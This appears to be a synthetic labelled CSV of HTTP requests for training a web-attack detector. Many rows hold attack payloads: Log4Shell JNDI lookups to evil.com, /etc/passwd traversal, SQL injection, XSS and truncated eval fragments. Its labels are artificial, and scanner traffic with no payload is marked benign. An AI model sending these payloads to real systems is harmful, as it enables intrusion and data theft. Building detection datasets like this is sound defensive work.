request_method,url,payload,user_agent,response_code,is_attack
PUT,/app/page57,,sqlmap/1.0,200,0
PUT,/app/page19,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page13,,sqlmap/1.0,404,0
GET,/app/page48,,Nikto/2.1.6,404,0
POST,/app/page43?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page92,,sqlmap/1.0,200,0
GET,/app/page18?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page48?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
POST,/app/page67?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page17,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page81?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page66,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page76?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,403,1
GET,/app/page38?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,500,1
POST,/app/page78?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page42?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,403,1
POST,/app/page95,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page15?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page25,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page35,,sqlmap/1.0,500,0
GET,/app/page81,,sqlmap/1.0,200,0
GET,/app/page7,,sqlmap/1.0,200,0
POST,/app/page47,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page65?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
GET,/app/page71,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page2,,sqlmap/1.0,200,0
PUT,/app/page97,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
DELETE,/app/page56?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),403,1
GET,/app/page53,,Mozilla/5.0 (compatible; Baiduspider/2.0),500,0
OPTIONS,/app/page19?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page52,,sqlmap/1.0,200,0
GET,/app/page54,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page20,,sqlmap/1.0,200,0
PUT,/app/page30,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page1?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page82,,sqlmap/1.0,200,0
GET,/app/page48?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page89?' OR 1=1 --,' OR 1=1 --,sqlmap/1.0,403,1
POST,/app/page37?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (compatible; Baiduspider/2.0),500,1
GET,/app/page72,,Nikto/2.1.6,200,0
GET,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page72,,Mozilla/5.0 (compatible; Baiduspider/2.0),403,0
GET,/app/page91?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page18,,Nikto/2.1.6,500,0
GET,/app/page10?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page11,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page62?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page73,,Nikto/2.1.6,500,0
PUT,/app/page3,,sqlmap/1.0,200,0
GET,/app/page45?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
DELETE,/app/page45?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page12?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page51,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page95?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page97,,sqlmap/1.0,200,0
GET,/app/page34?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page71,,Nikto/2.1.6,404,0
POST,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page22,,sqlmap/1.0,200,0
GET,/app/page58,,Nikto/2.1.6,200,0
GET,/app/page91?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
GET,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page19,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page54,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page36?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page88,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page63?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,403,1
GET,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page87,,sqlmap/1.0,200,0
POST,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page34,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page47,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
PUT,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page32?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page81?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page27?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page78,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page20,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page80,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page4?<script>alert('xss')</script>,<script>alert('xss')</script>,sqlmap/1.0,500,1
DELETE,/app/page84?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page21?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
DELETE,/app/page82,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page53?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page90,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page46?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
GET,/app/page16,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page47,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page25?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page38,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page91,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page31?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page29,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
PUT,/app/page71?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page43,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page45,,Nikto/2.1.6,403,0
POST,/app/page78,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
PUT,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page15,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page59?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page81?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page19?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
PUT,/app/page78,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page36,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page91?../../../etc/passwd,../../../etc/passwd,Nikto/2.1.6,500,1
OPTIONS,/app/page10,,Nikto/2.1.6,200,0
GET,/app/page43?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page68,,Nikto/2.1.6,404,0
GET,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page29,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page56?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page29?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,403,1
GET,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page2,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page46?<script>alert('xss')</script>,<script>alert('xss')</script>,sqlmap/1.0,403,1
POST,/app/page78?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),500,1
GET,/app/page77,,Nikto/2.1.6,200,0
GET,/app/page58?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page73?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page81,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page70?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page47,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page93?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
DELETE,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page78,,sqlmap/1.0,404,0
GET,/app/page41,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page78,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page46?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page32,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page47,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page30,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page1?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
DELETE,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page23,,Nikto/2.1.6,404,0
PUT,/app/page30?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page37?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page38,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page65,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page81,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page8,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page66?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page65?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,403,1
PUT,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page53,,sqlmap/1.0,500,0
POST,/app/page68?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page80,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page36,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page66,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page37,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page51,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page55,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page90,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page28?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page96,,sqlmap/1.0,200,0
POST,/app/page52?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page48?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
PUT,/app/page78,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page46,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page54,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
POST,/app/page16?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page16,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page10?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page90,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page26,,sqlmap/1.0,200,0
PUT,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page66?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page51,,Nikto/2.1.6,200,0
GET,/app/page56,,Nikto/2.1.6,200,0
GET,/app/page70,,sqlmap/1.0,200,0
GET,/app/page12?eval(String.fromCharCode(,eval(String.fromCharCode(,Nikto/2.1.6,403,1
GET,/app/page31,,Nikto/2.1.6,500,0
POST,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page77?../../../etc/passwd,../../../etc/passwd,Nikto/2.1.6,403,1
GET,/app/page45?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page93?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page2,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page56,,Nikto/2.1.6,200,0
POST,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page9,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page30,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page49,,sqlmap/1.0,200,0
OPTIONS,/app/page29,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page26,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page37,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page66,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page99?UNION SELECT * FROM users,UNION SELECT * FROM users,Nikto/2.1.6,403,1
DELETE,/app/page95,,sqlmap/1.0,200,0
POST,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page71,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page23,,Nikto/2.1.6,200,0
GET,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page7,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page70,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
DELETE,/app/page75,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page17,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page37,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
DELETE,/app/page33,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page5?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page75?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page39,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page25,,sqlmap/1.0,200,0
GET,/app/page29,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page52,,Nikto/2.1.6,200,0
GET,/app/page12,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page99?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page25?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,500,1
POST,/app/page31?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page95?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page6,,Nikto/2.1.6,200,0
PUT,/app/page33,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page94,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page63?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page46,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page55?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page66?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page7,,Mozilla/5.0 (compatible; Baiduspider/2.0),500,0
POST,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page47?<script>alert('xss')</script>,<script>alert('xss')</script>,Nikto/2.1.6,500,1
GET,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page89,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page82?UNION SELECT * FROM users,UNION SELECT * FROM users,Nikto/2.1.6,500,1
POST,/app/page44,,sqlmap/1.0,200,0
PUT,/app/page28?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page88,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page24?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page98,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page87,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page80?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (compatible; Baiduspider/2.0),403,1
GET,/app/page26,,Nikto/2.1.6,500,0
GET,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page48?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page17,,sqlmap/1.0,200,0
POST,/app/page11?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page85?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
PUT,/app/page92,,Nikto/2.1.6,200,0
POST,/app/page36?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page26,,Nikto/2.1.6,200,0
PUT,/app/page36,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page13,,sqlmap/1.0,200,0
PUT,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page84,,sqlmap/1.0,200,0
POST,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page8?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
DELETE,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
DELETE,/app/page81,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page38?<script>alert('xss')</script>,<script>alert('xss')</script>,sqlmap/1.0,500,1
GET,/app/page16?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Nikto/2.1.6,500,1
GET,/app/page33?' OR 1=1 --,' OR 1=1 --,Nikto/2.1.6,403,1
PUT,/app/page85,,sqlmap/1.0,404,0
POST,/app/page95?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page21,,sqlmap/1.0,200,0
GET,/app/page78,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page56?UNION SELECT * FROM users,UNION SELECT * FROM users,sqlmap/1.0,500,1
GET,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
